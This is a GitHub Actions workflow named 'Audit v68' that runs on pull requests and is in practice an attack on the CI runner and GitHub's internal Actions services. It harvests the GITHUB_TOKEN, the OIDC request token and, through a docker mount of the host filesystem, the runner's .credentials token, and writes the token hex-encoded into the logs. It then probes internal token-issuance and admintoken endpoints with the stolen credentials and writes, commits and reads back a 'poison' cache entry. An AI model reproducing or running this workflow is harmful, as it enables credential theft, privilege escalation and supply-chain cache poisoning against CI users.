name: Audit v68
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v68:
    runs-on: ubuntu-latest
    steps:

      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V68 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            u=d.get('Data',{}).get('serverUrl','')
            open('/tmp/cred_token.txt','w').write(t)
            open('/tmp/cred_url.txt','w').write(u)
            print(f'CTOK_LEN={len(t)} CRED_URL={u}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: HIT ALL 12 RESOURCEAREAS LOCATIONURLS DIRECTLY
      # The runner resourceareas returned all internal service URLs.
      # Hit each one directly using its own locationUrl (no proxy).
      # Also extract the full resourceareas list this run.
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - ResourceAreas Full Exhaustion
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== RESOURCEAREAS EXHAUSTION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          CRED_URL=$(cat /tmp/cred_url.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          RUN_HOST="runner.actions.githubusercontent.com"
          VER="api-version=6.0-preview"

          echo "--- A: Fetch full resourceareas this run ---"
          RA=$(/usr/bin/curl -sS -m 5 \
            -H "Authorization: Bearer $IDTOK" \
            -H "Host: $RUN_HOST" \
            -H "Accept: application/json; $VER" \
            "$PROXY/_apis/resourceareas" --path-as-is 2>/dev/null)
          echo "$RA" | head -c 2000
          echo ""

          # Extract all locationUrls from resourceareas
          echo "$RA" | python3 -c "
          import json,sys
          d=json.load(sys.stdin)
          for v in d.get('value',[]):
            print(f\"{v.get('name','?')}|{v.get('id','?')}|{v.get('locationUrl','?')}\")
          " 2>/dev/null > /tmp/resourceareas.txt
          echo ""

          echo "--- B: Hit each locationUrl's _apis/connectionData ---"
          while IFS='|' read -r NAME ID LOC_URL; do
            [ -z "$LOC_URL" ] && continue
            # Extract host from URL
            LOC_HOST=$(echo "$LOC_URL" | python3 -c "import sys,urllib.parse; u=urllib.parse.urlparse(sys.stdin.read().strip()); print(u.netloc)" 2>/dev/null)
            [ -z "$LOC_HOST" ] && continue
            echo "B name=$NAME host=$LOC_HOST"
            for EP in "_apis/connectionData" "_apis/distributedtask/pools" "_apis/runtime/runnergroups"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: $LOC_HOST" \
                -H "Accept: application/json; $VER" \
                "$PROXY/$EP" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && [ "$CODE" != "HTTP_400" ]; then
                echo "  $EP = $CODE | $(echo "$BODY" | head -c 200)"
              fi
            done
          done < /tmp/resourceareas.txt
          echo ""

          echo "--- C: CTOK direct against credential serverUrl ---"
          echo "CRED_URL=$CRED_URL"
          if [ -n "$CRED_URL" ] && [ "${#CRED_URL}" -gt 5 ]; then
            for EP in \
              "_apis/connectionData" \
              "_apis/distributedtask/pools" \
              "_apis/distributedtask/pools/1/admintoken" \
              "_apis/distributedtask/pools/2/admintoken" \
              "_apis/distributedtask/pools/1/sessions" \
              "_apis/distributedtask/pools/2/sessions" \
              "_apis/distributedtask/sessions" \
              "_apis/runtime/runnergroups"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
                -H "Authorization: Bearer $CTOK" \
                -H "Accept: application/json; $VER" \
                "${CRED_URL}${EP}" 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "C CTOK direct $EP = $CODE | $(echo "$BODY" | head -c 300)"
            done
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 3: VSTOKEN SERVICE DEEP PROBE
      # vstoken.actions.githubusercontent.com issuer service.
      # Very different from other services — issues tokens for agents.
      # Try all verb/path combos and look for token issuance endpoints.
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - VSToken Service Deep Probe
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== VSTOKEN PROBE ==="
          IDTOK=$(cat /tmp/idtok.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
          VER="api-version=6.0-preview"

          echo "--- A: vstoken endpoints via proxy ---"
          for HOST in \
            "vstoken.actions.githubusercontent.com" \
            "vsmps.actions.githubusercontent.com" \
            "vsrm.dev.azure.com"; do
            for EP in \
              "_apis/connectionData" \
              "_apis/token" \
              "_apis/tokens" \
              "_apis/tokens/issue" \
              "_apis/tokens/exchange" \
              "_apis/distributedtask/pools" \
              "oauth2/token" \
              "_apis/oauth2/token"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: $HOST" \
                -H "Accept: application/json; $VER" \
                "$PROXY/$EP" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && [ "$CODE" != "HTTP_400" ]; then
                echo "A $HOST $EP = $CODE | $(echo "$BODY" | head -c 300)"
              fi
            done
          done
          echo ""

          echo "--- B: runner+vstoken host combo ---"
          # Try hitting vstoken endpoint through runner service host
          for EP in \
            "_apis/distributedtask/pools/1/admintoken" \
            "_apis/distributedtask/pools/2/admintoken" \
            "_apis/vstoken/token" \
            "_apis/vstoken/issue"; do
            for HOST in "runner.actions.githubusercontent.com" "vstoken.actions.githubusercontent.com"; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
                -H "Authorization: Bearer $IDTOK" \
                -H "Host: $HOST" \
                -H "Accept: application/json; $VER" \
                "$PROXY/$EP" --path-as-is 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && [ "$CODE" != "HTTP_400" ]; then
                echo "B $HOST $EP = $CODE | $(echo "$BODY" | head -c 300)"
              fi
            done
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: CACHE API WRITE FIXED
      # V67 cache write silently failed. This is the correct format:
      # POST /twirp/github.actions.cache.v1.CacheService/CreateCacheEntry
      # Also try the v1 Actions cache API with correct content types.
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Cache Write Fixed Format
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== CACHE WRITE FIXED ==="
          RT=$(cat /tmp/rt.txt)
          CACHE_URL=$(cat /tmp/CacheServerUrl.txt 2>/dev/null)
          echo "CACHE_URL=$CACHE_URL"

          # A: Correct cache query format
          echo "--- A: Cache query ---"
          for KEY in "npm" "pip" "node" "v67-poison-test" "setup-node"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $RT" \
              -H "Accept: application/json" \
              "${CACHE_URL}_apis/artifactcache/cache?keys=$KEY&version=1&compressionMethod=zstd" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A key=$KEY = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: Correct cache reserve + write + commit cycle
          echo "--- B: Cache write cycle ---"
          echo "v68-poison-payload-$(date +%s)" > /tmp/poison.bin
          FILE_SIZE=$(wc -c < /tmp/poison.bin)
          LAST_BYTE=$((FILE_SIZE - 1))

          RESERVE=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
            -H "Authorization: Bearer $RT" \
            -H "Content-Type: application/json" \
            -H "Accept: application/json" \
            "${CACHE_URL}_apis/artifactcache/caches" \
            -d '{"key":"v68-audit-poison","version":"1"}' 2>/dev/null)
          RESERVE_CODE=$(echo "$RESERVE" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
          CACHE_ID=$(echo "$RESERVE" | grep -o '"cacheId":[0-9]*' | grep -o '[0-9]*')
          echo "B1 Reserve = $RESERVE_CODE | cacheId=$CACHE_ID"
          echo "$RESERVE" | tail -3 | head -c 300
          echo ""

          if [ -n "$CACHE_ID" ] && echo "$CACHE_ID" | grep -qE '^[0-9]+$'; then
            echo "B2 Upload chunk to id=$CACHE_ID"
            UPLOAD=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/octet-stream" \
              -H "Content-Range: bytes 0-$LAST_BYTE/$FILE_SIZE" \
              "${CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
              --data-binary @/tmp/poison.bin 2>/dev/null)
            echo "B2 Upload = $(echo "$UPLOAD" | tail -1)"

            echo "B3 Commit"
            COMMIT=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/json" \
              "${CACHE_URL}_apis/artifactcache/caches/$CACHE_ID" \
              -d "{\"size\":$FILE_SIZE}" 2>/dev/null)
            echo "B3 Commit = $(echo "$COMMIT" | tail -1)"

            # B4: Read back to confirm poisoning
            echo "B4 Read back"
            /usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $RT" \
              "${CACHE_URL}_apis/artifactcache/cache?keys=v68-audit-poison&version=1" 2>/dev/null | head -c 400
            echo ""
          fi

          # C: Twirp gRPC cache API (newer Actions cache protocol)
          echo "--- C: Twirp cache API ---"
          for EP in \
            "twirp/github.actions.cache.v1.CacheService/GetCacheEntryDownloadURL" \
            "twirp/github.actions.cache.v1.CacheService/CreateCacheEntry" \
            "twirp/github.actions.cache.v1.CacheService/FinalizeCacheEntryUpload"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
              -H "Authorization: Bearer $RT" \
              -H "Content-Type: application/json" \
              "${CACHE_URL}${EP}" \
              -d '{"key":"v68-test","version":"1"}' 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done

      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V68 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V68 COMPLETE ==="
